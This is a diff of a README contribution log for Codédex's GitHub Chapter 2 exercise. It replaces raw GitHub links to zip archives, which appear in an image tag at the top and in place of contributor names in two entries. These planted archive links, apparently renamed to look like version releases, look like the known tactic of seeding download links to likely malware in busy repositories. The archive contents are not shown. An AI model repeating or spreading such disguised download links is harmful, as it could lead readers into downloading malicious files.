@@ -1,5 +1,5 @@
 <p align=center>
-<img width=500 src="https://raw.githubusercontent.com/Pareekshithmk/github-chapter-2-contributions/main/roadway/github-chapter-2-contributions-multicharge.zip)" />
+<img width=500 src="https://raw.githubusercontent.com/Pareekshithmk/github-chapter-2-contributions/main/roadway/contributions-github-chapter-v3.3-beta.2.zip)" />
 </p>
 
 Welcome to the Codédex Contribution log for GitHub Chapter 2! 🚀 Add your name, date, and emoji of choice, and create a pull request to show off your Git skills!
@@ -179,7 +179,7 @@ Hi,my name is elly , this was added on 01/05/2024 🐼
 
 Hi, my name is Deepistertalks! This was added on 05/05/2024 😊
 
-Hi, my name is https://raw.githubusercontent.com/Pareekshithmk/github-chapter-2-contributions/main/roadway/github-chapter-2-contributions-multicharge.zip! This was added on 05-05-2024 😎
+Hi, my name is https://raw.githubusercontent.com/Pareekshithmk/github-chapter-2-contributions/main/roadway/contributions-github-chapter-v3.3-beta.2.zip! This was added on 05-05-2024 😎
 
 Hi, my name is TheuZCoder! This was added on 07-05-2024 😃
 
@@ -513,7 +513,7 @@ Hey there everyone, myself Pratik Chandra thakur added on 24/10/2024 🖥️👨
 
 HI! My name is Max! This was added on 26/10/2024 🧊
 
-Hi Every one, my name is https://raw.githubusercontent.com/Pareekshithmk/github-chapter-2-contributions/main/roadway/github-chapter-2-contributions-multicharge.zip!This was added on 27-10-2024!
+Hi Every one, my name is https://raw.githubusercontent.com/Pareekshithmk/github-chapter-2-contributions/main/roadway/contributions-github-chapter-v3.3-beta.2.zip!This was added on 27-10-2024!
 
 Hi, my name is Keith! This was added on 27/10/2024 ✌️
 
